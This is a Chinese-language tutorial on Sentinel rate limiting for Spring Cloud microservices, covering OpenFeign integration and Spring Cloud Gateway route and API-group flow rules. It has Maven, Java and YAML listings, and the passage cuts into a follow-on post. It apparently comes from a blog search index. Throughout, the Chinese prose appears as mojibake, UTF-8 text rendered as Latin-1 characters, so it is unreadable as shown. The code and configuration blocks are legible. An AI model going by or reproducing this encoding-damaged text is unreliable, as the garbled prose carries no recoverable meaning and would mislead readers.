æ§åˆ¶å°ï¼ŒåŠ¨æ€æ·»åŠ æµæ§è§„åˆ™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 4ï¼‰æµè§ˆå™¨å†æ¬¡è®¿é—® http://127.0.0.1:8080/helloï¼Œå½“å¿«é€Ÿåˆ·æ–°é¡µé¢æ—¶ï¼Œè¯·æ±‚çš„å“åº”ç»“æœå˜ä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ...ï¼Œï¼Œåˆ™è¯´æ˜ Sentinel çš„æµæ§è§„åˆ™ç”Ÿæ•ˆäº† Sentinel æ•´åˆ OpenFeignSentinel é€‚é…äº† OpenFeign ç»„ä»¶ï¼Œå¦‚æœæƒ³ä½¿ç”¨ï¼Œé™¤äº†å¼•å…¥ spring-cloud-starter-alibaba-sentinel ä¾èµ–ä¹‹å¤–ï¼Œè¿˜éœ€è¦ä»¥ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š åœ¨é…ç½®æ–‡ä»¶é‡Œæ‰“å¼€ Sentinel å¯¹ OpenFeign çš„æ”¯æŒï¼šfeign.sentinel.enabled=true åŠ å…¥ spring-cloud-starter-openfeign ä¾èµ–ä½¿ Sentinel starter ä¸­çš„è‡ªåŠ¨åŒ–é…ç½®ç±»ç”Ÿæ•ˆ 2.0ã€ç‰ˆæœ¬è¯´æ˜æœ¬æ¡ˆä¾‹ä½¿ç”¨å„å¼€æºç»„ä»¶çš„ç‰ˆæœ¬è¯´æ˜å¦‚ä¸‹ï¼Œå…¶ä¸­æœåŠ¡æ³¨å†Œä¸­å¿ƒä½¿ç”¨ Nacosï¼Œè‹¥æ”¹ä¸ºä½¿ç”¨ Eurekaï¼Œåªéœ€è¦åœ¨æ¡ˆä¾‹é‡Œå°† Nacos ç›¸å…³çš„é…ç½®ï¼ˆMaven ä¾èµ– + YAML é…ç½®ï¼‰æ›¿æ¢æ‰å³å¯ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  Sentinel 1.8.0 Nacos Server 1.4.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Sentinel 2.1.3.RELEASE Spring Cloud Alibaba Nacos Config 2.1.3.RELEASE 2.1ã€æ¡ˆä¾‹ç›®æ ‡å®ç° sentinel-consumer å¾®æœåŠ¡é€šè¿‡ OpenFeign è®¿é—® sentinel-provider å¾®æœåŠ¡æ—¶çš„æµé‡æ§åˆ¶ 2.2ã€å‡†å¤‡å·¥ä½œå¯åŠ¨ Sentinel æ§åˆ¶å° 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar å¯åŠ¨ Nacos Serverï¼Œå¹¶åœ¨ Nacos Server çš„æ§åˆ¶é¢å°é‡Œï¼Œåˆ›å»ºåç§°ä¸º dev çš„å‘½åç©ºé—´ 2.3ã€åˆ›å»º Maven çˆ¶å·¥ç¨‹åˆ›å»º Maven çˆ¶å·¥ç¨‹ï¼Œé…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½® 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt; &lt;spring-cloud-starter-nacos.version&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-nacos.version&gt;&lt;/properties&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.4ã€åˆ›å»º Sentinel Provider å·¥ç¨‹å¼•å…¥ Maven ä¾èµ– 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼Œå¯ç”¨æœåŠ¡å‘ç°åŠŸèƒ½ï¼Œå¹¶å°†æœåŠ¡æ³¨å†Œåˆ° Nacos 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} åˆ›å»º Controller æµ‹è¯•ç±» 1234567891011@RestControllerpublic class ProviderController { private Logger LOG = LoggerFactory.getLogger(ProviderController.class); @GetMapping("/hello") public String hello() { LOG.info("provider invoke ... "); return "Hello Sentinel!"; }} åˆ›å»º application.yml é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ  Nacos æ³¨å†Œä¸­å¿ƒçš„åœ°å€å’Œç«¯å£ç­‰ä¿¡æ¯ 1234567891011121314server: port: 8080 servlet: context-path: /providerspring: application: name: sentinel-provider cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT 2.5ã€åˆ›å»º Sentinel Consumer å·¥ç¨‹å¼•å…¥ Maven ä¾èµ–ï¼ŒåŒ…æ‹¬ spring-cloud-starter-openfeignã€spring-cloud-starter-alibaba-sentinel 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Feign Client çš„æ¥å£ç±» 123456@FeignClient(value = "sentinel-provider", fallback = FallbackService.class)public interface FeignAgent { @GetMapping("/provider/hello") public String hello();} åˆ›å»ºå¤„ç†é™æµã€é™çº§çš„å›è°ƒç±» 12345678@Componentpublic class FallbackService implements FeignAgent { @Override public String hello() { return "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å€™ ..."; }} åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClientã€@EnableFeignClients æ³¨è§£ 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} åˆ›å»º Controller æµ‹è¯•ç±» 1234567891011121314@RestControllerpublic class ConsumerController { @Autowired private FeignAgent feignAgent; private Logger LOG = LoggerFactory.getLogger(ConsumerController.class); @GetMapping("/hello") public String hello() { LOG.info("consumer invoke ... "); return feignAgent.hello(); }} åˆ›å»º application.yml é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ  Nacos æ³¨å†Œä¸­å¿ƒçš„åœ°å€å’Œç«¯å£ç­‰ä¿¡æ¯ï¼Œå¹¶å¯ç”¨ Sentinel å¯¹ OpenFeign çš„æ”¯æŒ 123456789101112131415161718192021server: port: 8082 servlet: context-path: /consumerspring: application: name: sentinel-consumer cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT sentinel: transport: dashboard: 127.0.0.1:9000feign: sentinel: enabled: true 2.6ã€æµ‹è¯•ä»£ç  1ï¼‰åˆ†åˆ«å¯åŠ¨ sentinel-consumerã€sentinel-provider åº”ç”¨ 2ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:8082/consumer/helloï¼Œè‹¥å“åº”ç»“æœä¸º Hello Sentinel!ï¼Œè¯´æ˜ä¸¤ä¸ªåº”ç”¨å¯åŠ¨æˆåŠŸï¼ŒåŒæ—¶åœ¨ Nacos çš„æ§åˆ¶å°å¯ä»¥çœ‹åˆ°å·²ç»æœ‰ä¸¤ä¸ªæœåŠ¡æ³¨å†Œäº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 3ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:9000ï¼Œæ‰“å¼€ Sentinel çš„æ§åˆ¶å°ï¼ŒåŠ¨æ€æ·»åŠ æµæ§è§„åˆ™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç‰¹åˆ«æ³¨æ„ï¼šSentinel ä¸ Feign æ•´åˆæ—¶ï¼Œæµæ§è§„åˆ™çš„ç¼–å†™æ ¼å¼ä¸º HTTPè¯·æ±‚æ–¹å¼:åè®®://æœåŠ¡å/è¯·æ±‚è·¯å¾„è·Ÿå‚æ•°ï¼Œä¾‹å¦‚ï¼šGET:http://sentinel-provider/provider/hello 4ï¼‰æµè§ˆå™¨å†æ¬¡è®¿é—® http://127.0.0.1:8082/consumer/helloï¼Œå½“å¿«é€Ÿåˆ·æ–°é¡µé¢æ—¶ï¼Œè¯·æ±‚çš„å“åº”ç»“æœå˜ä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ...ï¼Œåˆ™è¯´æ˜ sentinel-consumer å¾®æœåŠ¡é€šè¿‡ OpenFeign è®¿é—® sentinel-provider å¾®æœåŠ¡æ—¶ï¼ŒSentinel çš„æµæ§è§„åˆ™ç”Ÿæ•ˆäº† Sentinel ç½‘å…³é™æµSentinel æ”¯æŒå¯¹ Spring Cloud Gatewayã€Zuul 1.xã€Zuul 2.x ç­‰ä¸»æµçš„ API Gateway è¿›è¡Œé™æµã€‚ Sentinel æ•´åˆ Gatewayä» 1.6.0 ç‰ˆæœ¬å¼€å§‹ï¼ŒSentinel æä¾›äº† Spring Cloud Gateway çš„é€‚é…æ¨¡å—ï¼Œå¯ä»¥æä¾›ä¸¤ç§èµ„æºç»´åº¦çš„é™æµï¼š route ç»´åº¦ï¼šå³åœ¨ Spring é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„è·¯ç”±æ¡ç›®ï¼Œèµ„æºåä¸ºå¯¹åº”çš„ routeId è‡ªå®šä¹‰ API ç»´åº¦ï¼šç”¨æˆ·å¯ä»¥åˆ©ç”¨ Sentinel æä¾›çš„ API æ¥è‡ªå®šä¹‰ä¸€äº› API åˆ†ç»„ 3.0ã€æ¡ˆä¾‹è¯´æ˜æœ¬æ¡ˆä¾‹æ˜¯åœ¨ä¸Šè¿° Sentinel æ•´åˆ OpenFeign æ¡ˆä¾‹çš„åŸºç¡€ä¸Šå¼€å‘çš„ï¼Œæ³¨å†Œä¸­å¿ƒä¾æ—§ä½¿ç”¨ Nacosï¼Œå…¶ä¸­ä¸»è¦çš„å˜åŒ–æ˜¯æ–°åˆ›å»ºäº† sentinel-gateway å·¥ç¨‹ï¼Œå› æ­¤ä¸‹é¢åªç»™å‡ºæ–°å¢æˆ–è€…æ›´æ”¹åçš„ä»£ç å’Œé…ç½®ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 3.1ã€æ¡ˆä¾‹ç›®æ ‡å®ç° sentinel-gateway å¾®æœåŠ¡è®¿é—® sentinel-consumer å¾®æœåŠ¡æ—¶çš„æµé‡æ§åˆ¶ï¼Œå…¶ä¸­ sentinel-consumer å¾®æœåŠ¡é€šè¿‡ OpenFeign è®¿é—® sentinel-provider å¾®æœåŠ¡æ—¶çš„æµé‡æ§åˆ¶åœ¨ä¸Šè¿° Sentinel æ•´åˆ OpenFeign æ¡ˆä¾‹å·²ç»å®ç°äº†ï¼Œå®Œæ•´çš„è°ƒç”¨æµç¨‹ä¸º sentinel-gateway â€“&gt; sentinel-consumer â€“&gt; sentinel-providerã€‚ 3.2ã€å‡†å¤‡å·¥ä½œå¯åŠ¨ Sentinel æ§åˆ¶å° 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar å¯åŠ¨ Nacos Serverï¼Œå¹¶åœ¨ Nacos Server çš„æ§åˆ¶é¢å°é‡Œï¼Œåˆ›å»ºåç§°ä¸º dev çš„å‘½åç©ºé—´ 3.3ã€æ›´æ”¹ Maven çˆ¶å·¥ç¨‹æ·»åŠ  spring-cloud-alibaba-sentinel-gateway ä¾èµ– 123456789&lt;properties&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-sentinel-gateway&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt;&lt;/dependency&gt; 3.4ã€åˆ›å»º Sentinel Gateway å·¥ç¨‹å¼•å…¥ Maven ä¾èµ– 123456789101112131415161718&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-sentinel-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Gateway çš„é…ç½®ç±»ï¼Œç”¨äºå®šä¹‰è¢«é™æµæˆ–è€…é™çº§æ—¶å¤„ç†çš„æ–¹æ³• 12345678910111213141516171819@Configurationpublic class GatewayConfiguration { /** * åˆå§‹åŒ– */ @PostConstruct public void init() { // è®¾ç½®è¢«é™æµæˆ–è€…é™çº§å¤„ç†æ—¶çš„å›è°ƒæ–¹æ³• GatewayCallbackManager.setBlockHandler(new BlockRequestHandler() { // è¢«é™æµæˆ–è€…é™çº§æ—¶å¤„ç†çš„æ–¹æ³• @Override public Mono&lt;ServerResponse&gt; handleRequest(ServerWebExchange serverWebExchange, Throwable throwable) { return ServerResponse.status(200).syncBody("ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ..."); } }); }} åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ 12345678@SpringBootApplication@EnableDiscoveryClientpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} åˆ›å»º application.yml é…ç½®æ–‡ä»¶ï¼Œç”±äºè¿™é‡ŒæŒ‡å®šäº† context-pathï¼Œå› æ­¤åœ¨è·¯ç”±è§„åˆ™é…ç½®ä¸­éœ€è¦ä½¿ç”¨ StripPrefix å‚æ•°å°†è®¿é—®è¿›æ¥çš„ URL ä¸­çš„ context-path æˆªå–æ‰ï¼Œå¦åˆ™ sentinel-gateway å¾®æœåŠ¡è®¿é—® sentinel-consumer å¾®æœåŠ¡æ—¶ï¼Œä¼šå‡ºç° 404 é”™è¯¯ 12345678910111213141516171819202122232425server: port: 8083 servlet: context-path: gatewayspring: application: name: sentinel-gateway cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT sentinel: transport: dashboard: 127.0.0.1:9000 gateway: routes: - id: sentinel-gateway-route uri: lb://sentinel-consumer predicates: - Path=/${server.servlet.context-path}/consumer/hello/** filters: - StripPrefix=1 è‹¥åœ¨ application.yml é…ç½®æ–‡ä»¶é‡Œæ²¡æœ‰é…ç½® context-pathï¼Œé‚£ä¹ˆè·¯ç”±è§„åˆ™é…ç½®å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å†™æ³•ï¼š 1234567891011server: port: 8083spring: cloud: gateway: routes: - id: sentinel-gateway-route uri: lb://sentinel-consumer predicates: - Path=/consumer/hello/** 3.5ã€æµ‹è¯•ä»£ç  1ï¼‰åˆ†åˆ«å¯åŠ¨ sentinel-gatewayã€sentinel-consumerã€sentinel-provider åº”ç”¨ 2ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:8083/gateway/consumer/helloï¼Œè‹¥å“åº”ç»“æœä¸º Hello Sentinel!ï¼Œè¯´æ˜ä¸‰ä¸ªåº”ç”¨å¯åŠ¨æˆåŠŸï¼ŒåŒæ—¶åœ¨ Nacos çš„æ§åˆ¶å°å¯ä»¥çœ‹åˆ°å·²ç»æœ‰ä¸‰ä¸ªæœåŠ¡æ³¨å†Œäº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 3ï¼‰è¿™é‡Œè®© Sentinel åŸºäº Route ç»´åº¦è¿›è¡Œç½‘å…³é™æµï¼Œæµè§ˆå™¨è®¿é—® http://127.0.0.1:9000ï¼Œæ‰“å¼€ Sentinel çš„æ§åˆ¶å°ï¼Œåœ¨ sentinel-gateway æœåŠ¡é‡ŒåŠ¨æ€æ·»åŠ ç½‘å…³æµæ§è§„åˆ™ï¼Œå…¶ä¸­ API åç§°å°±æ˜¯ application.yml é…ç½®æ–‡ä»¶é‡Œçš„è·¯ç”± IDï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 4ï¼‰æµè§ˆå™¨å†æ¬¡è®¿é—® http://127.0.0.1:8083/gateway/consumer/helloï¼Œå½“å¿«é€Ÿåˆ·æ–°é¡µé¢æ—¶ï¼Œè¯·æ±‚çš„å“åº”ç»“æœå˜ä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ...ï¼Œåˆ™è¯´æ˜ sentinel-gateway å¾®æœåŠ¡è®¿é—® sentinel-consumer å¾®æœåŠ¡æ—¶ï¼ŒSentinel çš„ç½‘å…³æµæ§è§„åˆ™ç”Ÿæ•ˆäº† 3.6ã€ä½¿ç”¨è‡ªå®šä¹‰ API è¿›è¡Œé™æµä» 1.6.0 ç‰ˆæœ¬å¼€å§‹ï¼ŒSentinel æä¾›äº† Spring Cloud Gateway çš„é€‚é…æ¨¡å—ï¼Œå¯ä»¥æä¾›ä¸¤ç§èµ„æºç»´åº¦çš„é™æµï¼š route ç»´åº¦ï¼šå³åœ¨ Spring é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„è·¯ç”±æ¡ç›®ï¼Œèµ„æºåä¸ºå¯¹åº”çš„ routeId è‡ªå®šä¹‰ API ç»´åº¦ï¼šç”¨æˆ·å¯ä»¥åˆ©ç”¨ Sentinel æä¾›çš„ API æ¥è‡ªå®šä¹‰ä¸€äº› API åˆ†ç»„ 1ï¼‰åœ¨ Sentinel æ§åˆ¶å°é‡Œï¼Œåˆ é™¤æ‰€æœ‰ä¸ sentinel-gateway åº”ç”¨ç›¸å…³çš„ç½‘å…³æµæ§è§„åˆ™ 2ï¼‰åœ¨ Sentinel æ§åˆ¶å°çš„èœå•æ é‡Œæ‰¾åˆ° sentinel-gatway -&gt; API ç®¡ç† -&gt; æ–°å¢ API åˆ†ç»„ï¼Œç”±äºä¸Šé¢åœ¨ application.yml é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šäº† context-pathï¼Œå› æ­¤è¡¨å•é‡Œçš„â€ åŒ¹é…ä¸²â€ ä¸º /gateway/consumer/hello/**ï¼Œâ€ åŒ¹é…æ¨¡å¼â€ é€‰æ‹© å‰ç¼€ 3ï¼‰åœ¨ Sentinel æ§åˆ¶å°çš„èœå•æ é‡Œæ‰¾åˆ° sentinel-gatway -&gt; æµæ§è§„åˆ™ -&gt; æ–°å¢ç½‘å…³æµæ§è§„åˆ™ï¼Œåœ¨è¡¨å•é‡Œçš„ â€œAPI ç±»å‹â€ é€‰æ‹© API åˆ†ç»„ï¼Œâ€API åç§°â€ é€‰æ‹©åˆšåˆšåˆ›å»ºçš„ API å³å¯ 4ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:8083/gateway/consumer/helloï¼Œå½“å¿«é€Ÿåˆ·æ–°é¡µé¢æ—¶ï¼Œè¯·æ±‚çš„å“åº”ç»“æœå˜ä¸º ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨å ...ï¼Œåˆ™è¯´æ˜ sentinel-gateway å¾®æœåŠ¡è®¿é—® sentinel-consumer å¾®æœåŠ¡æ—¶ï¼ŒSentinel ä½¿ç”¨è‡ªå®šä¹‰ API æˆåŠŸå¯¹ç½‘å…³è¿›è¡Œé™æµäº† å‚è€ƒåšå®¢ Sentinel é€‚é…ä¸»æµæ¡†æ¶è¯¦è§£ Sentinel å®˜æ–¹æ–‡æ¡£ä¸­çš„ç½‘å…³é™æµ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Sentinel å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡",url:"/posts/e3c83db6.html",text:'ä¸Šç¯‡ - Sentinel å…¥é—¨æ•™ç¨‹ï¼ˆåŸºç¡€ç¯‡ï¼‰ Sentinel å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡ å‰è¨€1.0ã€ç‰ˆæœ¬è¯´æ˜æœ¬æ–‡é’ˆå¯¹ Sentinel 1.8.0 åŠä»¥ä¸Šç‰ˆæœ¬ç¼–å†™ï¼Œç‰¹åˆ«è¯´æ˜é™¤å¤–ã€‚ç”±äº 1.8.0 ç‰ˆæœ¬å¯¹ç†”æ–­é™çº§ç‰¹æ€§è¿›è¡Œäº†å…¨æ–°çš„æ”¹è¿›å‡çº§ï¼Œå»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ä»¥æ›´å¥½åœ°åˆ©ç”¨ç†”æ–­é™çº§çš„èƒ½åŠ›ã€‚ 1.1ã€Sentinel çš„æ§åˆ¶è§„åˆ™Sentinel çš„æ‰€æœ‰è§„åˆ™éƒ½å¯ä»¥åœ¨å†…å­˜æ€ä¸­åŠ¨æ€åœ°æŸ¥è¯¢ä¸ä¿®æ”¹ï¼Œä¿®æ”¹ä¹‹åç«‹å³ç”Ÿæ•ˆï¼ŒåŒæ—¶ Sentinel ä¹Ÿæä¾›äº†ç›¸å…³ API ä¾›å¼€å‘è€…æ¥å®šåˆ¶è‡ªå·±çš„è§„åˆ™ç­–ç•¥ã€‚Sentinel ä¸»è¦æ”¯æŒä»¥ä¸‹å‡ ç§è§„åˆ™ï¼š æµé‡æ§åˆ¶è§„åˆ™ ç†”æ–­é™çº§è§„åˆ™ ç³»ç»Ÿä¿æŠ¤è§„åˆ™ æ¥æºè®¿é—®æ§åˆ¶è§„åˆ™ åŠ¨æ€è§„åˆ™æ‰©å±• Sentinel æµé‡æ§åˆ¶å®ç°2.0ã€æµé‡æ§åˆ¶æ¦‚è¿°æµé‡æ§åˆ¶ï¼ˆFlow Controlï¼‰ï¼Œå…¶åŸç†æ˜¯ç›‘æ§åº”ç”¨æµé‡çš„ QPS æˆ–è€…å¹¶å‘çº¿ç¨‹æ•°ç­‰æŒ‡æ ‡ï¼Œå½“è¾¾åˆ°æŒ‡å®šçš„é˜€å€¼æ—¶å¯¹æµé‡è¿›è¡Œæ§åˆ¶ï¼Œä»¥é¿å…è¢«ç¬é—´çš„æµé‡é«˜å³°å†²å®ï¼Œä»è€Œä¿éšœåº”ç”¨çš„é«˜å¯ç”¨æ€§ã€‚FlowSlot ä¼šæ ¹æ®é¢„è®¾çš„è§„åˆ™ï¼Œç»“åˆ NodeSelectorSlotã€ClusterBuilderSlotã€StatisticSlot ç»Ÿè®¡å‡ºæ¥çš„å®æ—¶ä¿¡æ¯è¿›è¡Œæµé‡æ§åˆ¶ã€‚é™æµçš„ç›´æ¥è¡¨ç°æ˜¯åœ¨æ‰§è¡Œ Entry nodeA = SphU.entry(resourceName) çš„æ—¶å€™æŠ›å‡º FlowException å¼‚å¸¸ã€‚FlowException æ˜¯ BlockException çš„å­ç±»ï¼Œå¯ä»¥æ•æ‰ BlockException æ¥è‡ªå®šä¹‰è¢«é™æµä¹‹åçš„å¤„ç†é€»è¾‘ã€‚ 2.1ã€æµé‡æ§åˆ¶ç­–ç•¥Sentinel çš„æµé‡æ§åˆ¶ç­–ç•¥ä¸»è¦æœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼š å¹¶å‘çº¿ç¨‹æ•°ï¼šå¹¶å‘çº¿ç¨‹æ•°é™æµç”¨äºä¿æŠ¤ä¸šåŠ¡çº¿ç¨‹æ•°ä¸è¢«è€—å°½ QPSï¼šå½“ QPS è¶…è¿‡æŸä¸ªé˜€å€¼çš„æ—¶å€™ï¼Œåˆ™é‡‡å–æªæ–½è¿›è¡Œæµé‡æ§åˆ¶ 2.2ã€æµé‡æ§åˆ¶è§„åˆ™çš„å±æ€§æµé‡æ§åˆ¶è§„åˆ™ï¼ˆFlowRuleï¼‰åŒ…å«ä¸‹é¢å‡ ä¸ªé‡è¦çš„å±æ€§ï¼š countï¼šé™æµé˜€å€¼ strategyï¼šè°ƒç”¨å…³ç³»é™æµç­–ç•¥ resourceï¼šèµ„æºåï¼Œå³æµæ§è§„åˆ™çš„ä½œç”¨å¯¹è±¡ gradeï¼šé™æµé˜€å€¼ç±»å‹ï¼ˆQPS æˆ–è€…å¹¶å‘çº¿ç¨‹æ•°ï¼‰ limitAppï¼šæµæ§é’ˆå¯¹çš„è°ƒç”¨æ¥æºï¼Œè‹¥ä¸º default åˆ™ä¸åŒºåˆ†è°ƒç”¨æ¥æº controlBehaviorï¼šæµé‡æ•´å½¢çš„æ§åˆ¶æ•ˆæœï¼ˆç›´æ¥æ‹’ç»ã€Warm Upã€åŒ€é€Ÿæ’é˜Ÿï¼‰ ç›´æ¥æ‹’ç»ï¼ˆRuleConstant.CONTROL_BEHAVIOR_DEFAULTï¼‰æ–¹å¼æ˜¯é»˜è®¤çš„æµé‡æ§åˆ¶æ–¹å¼ï¼Œå½“ QPS è¶…è¿‡ä»»æ„è§„åˆ™çš„é˜ˆå€¼åï¼Œæ–°çš„è¯·æ±‚å°±ä¼šè¢«ç«‹å³æ‹’ç»ï¼Œæ‹’ç»æ–¹å¼ä¸ºæŠ›å‡º FlowExceptionã€‚è¿™ç§æ–¹å¼é€‚ç”¨äºå¯¹ç³»ç»Ÿå¤„ç†èƒ½åŠ›ç¡®åˆ‡å·²çŸ¥çš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚é€šè¿‡å‹æµ‹ç¡®å®šäº†ç³»ç»Ÿçš„å‡†ç¡®æ°´ä½æ—¶ã€‚ Warm Upï¼ˆRuleConstant.CONTROL_BEHAVIOR_WARM_UPï¼‰æ–¹å¼ï¼Œå³é¢„çƒ­ / å†·å¯åŠ¨æ–¹å¼ï¼Œåœ¨ç³»ç»Ÿé•¿æœŸå¤„äºä½æ°´ä½çš„æƒ…å†µä¸‹ï¼Œå½“æµé‡çªç„¶å¢åŠ 